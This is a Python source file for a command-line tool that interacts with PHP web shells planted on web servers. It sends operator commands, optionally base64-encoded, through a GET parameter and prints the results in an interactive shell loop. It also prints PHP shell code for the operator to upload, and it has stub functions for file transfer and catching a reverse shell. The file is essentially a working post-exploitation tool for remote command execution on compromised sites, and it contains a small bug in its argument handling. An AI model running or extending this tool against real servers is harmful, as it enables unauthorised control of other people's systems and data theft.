import web_utils
import sys
from base64 import b64encode, b64decode
import binascii
import os
import argparse

# test change

basepath = os.path.dirname(os.path.abspath(__file__))

class PHP_Shell_Handler:
    def __init__(self, webshell_url, webshell_get_param="phpshellcmd", encoded=True):
        try:
            web_utils.validate_url(webshell_url)
        except web_utils.InvalidUrlError:
            print(f"[-] - The provided url: '{webshell_url} does not seem to be a valid url'")
            sys.exit(0)

        if not web_utils.connection_check(webshell_url):
            sys.exit(1)

        self.webshell_url = webshell_url
        self.webshell_get_param = webshell_get_param
        self.encoded = encoded
    
    def _encode_cmd(self, cmd):
        encoded_cmd = b64encode(cmd.encode()).decode()
        return encoded_cmd

    def _decode_result(self, result):
        try:
            decoded_result = b64decode(result.encode()).decode()
        except binascii.Error:
            return f"[-] - Result was not valid base64 and therefore could not be decoded...\nRESULT:\n{result}"
        
        return decoded_result

    def _exec_cmd(self, cmd):
        if self.encoded:
            cmd = self._encode_cmd(cmd)

        request_url = self.webshell_url + "?" + self.webshell_get_param + "=" + cmd

        result = web_utils.make_request(request_url).text

        if self.encoded:
            return self._decode_result(result)
        
        return result

    def upload_file_to_server(self):
        pass

    def download_file_from_server(self):
        pass

    def switch_webshell(self):
        pass 

    def catch_reverse_shell(self):
        pass

    def shell(self):
        shell_filename = basepath +"/phpshells/shell.php"
        if self.encoded:
           shell_filename = basepath + "/phpshells/encoded_shell.php" 

        with open(shell_filename, "r") as f:
            print("[!] - Upload a shell with this php inside to use this shell handler - [!]:\n\n")
            print(f.read() + "\n")

        shell_banner = self.webshell_url.split("/")[-1].split('.')[0] + "@" + self.webshell_url.split("/")[-2]
        
        while True:
            cmd = input(f"[ {shell_banner} ] > ")
            if not cmd:
                continue

            elif cmd.upper().startswith("UPLOAD"):
                self.upload_file_to_server()

            elif cmd.upper().startswith("DOWNLOAD"):
                self.download_file_from_server()

            elif cmd.upper().startswith("SWITCHSHELL"):
                self.switch_webshell()

            elif cmd.upper().startswith("SHELL"):
                self.catch_reverse_shell()

            else:
                print(self._exec_cmd(cmd))



def main():
    arg_parser = argparse.ArgumentParser(description="Python based tool to interact with php web shells!")
    arg_parser.add_argument("-u", "--url", help=f"The URL location that your web shell will be uploaded to", required=True)
    arg_parser.add_argument("-p", "--phpparam", help=f"The name of the php get parameter in the php file uploaded (default of 'phpgetshell' is used with the built in php shells that are suggested to use")
    arg_parser.add_argument("--encoded", help=f"Decide whether communication with the shell will be encoded or not (default is not encoded)", nargs='*')

    args = arg_parser.parse_args()

    url = args.url
    if args.phpparam:
        php_param_name = args.phpparam
    encoded = False
    if args.encoded != None:
        encoded = True
    if php_param_name:
        handler = PHP_Shell_Handler(url, encoded=encoded, webshell_get_param=php_param_name)
    else:
        handler = PHP_Shell_Handler(url, encoded=encoded)
        
    handler.shell()


if __name__ == '__main__':
    main()
        

